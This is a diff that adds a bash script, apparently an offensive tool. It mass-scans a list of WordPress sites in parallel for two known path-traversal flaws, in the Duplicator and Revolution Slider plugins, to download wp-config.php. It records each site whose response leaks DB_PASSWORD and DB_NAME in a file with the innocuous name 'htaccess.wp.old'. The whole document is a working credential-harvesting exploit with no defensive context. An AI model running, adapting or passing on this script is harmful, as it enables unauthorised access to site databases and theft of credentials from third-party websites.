@@ -1,0 +1,95 @@
+#!/bin/bash
+
+# Configuration for the download paths
+DowloadConfig=(
+    '/wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php'
+    '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'
+)
+
+# Function to check if DB_PASSWORD and DB_NAME are in the response
+Exploitz() {
+    site=$1
+    path=$2
+
+    # Construct the full URL to check
+    Exp="${site}${path}"
+
+    # Make the request to the site and capture the response, follow redirects (-L)
+    CheckWp=$(curl -s -L --max-time 7 --header "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0" "http://${Exp}")
+
+    # Check if DB_PASSWORD and DB_NAME are in the response
+    if echo "$CheckWp" | grep -q "DB_PASSWORD" && echo "$CheckWp" | grep -q "DB_NAME"; then
+        # Log the successful URL in htaccess.wp.old
+        echo "${Exp}" >> htaccess.wp.old
+        return 0  # Success
+    fi
+
+    return 1  # Failure
+}
+
+# Function to run the exploitation checks for a single site
+Adminergo() {
+    site=$1
+
+    for path in "${DowloadConfig[@]}"; do
+        if Exploitz "$site" "$path"; then
+            # If Exploitz returns 0 (success), stop further checks
+            return 0
+        fi
+    done
+
+    return 1  # If none of the paths succeeded
+}
+
+# Main function
+main() {
+    # Check if the arguments are passed correctly
+    if [ $# -lt 2 ]; then
+
+        exit 1
+    fi
+
+    Target=$1
+    thread_count=$2
+
+    # Check if the target file exists
+    if [ ! -f "$Target" ]; then
+
+        exit 1
+    fi
+
+    # Read target sites from the input file
+    TEXTList=$(<"$Target")
+
+    start_time=$(date +%s)
+
+    # Limit the number of concurrent background jobs based on the argument
+    job_count=0
+
+    # Process the sites using a for loop and background jobs
+    for site in $TEXTList; do
+#        echo "Processing site: $site"
+        Adminergo "$site" &  # Run Adminergo in the background
+        ((job_count++))
+
+        # If we've reached the specified number of background jobs, wait for them to finish before starting new ones
+        if ((job_count >= thread_count)); then
+            wait  # Wait for all background jobs to finish
+            job_count=0  # Reset job count
+        fi
+    done
+
+    # Wait for any remaining jobs to finish
+    wait
+
+    end_time=$(date +%s)
+    totaltime=$((end_time - start_time))
+
+    echo "-------------" >> DONE.txt
+    echo "${Target} ${totaltime}" >> DONE.txt
+	echo "JOB COMPLETED ZeuX"
+}
+
+# Call the main function with the arguments
+main "$@"
+
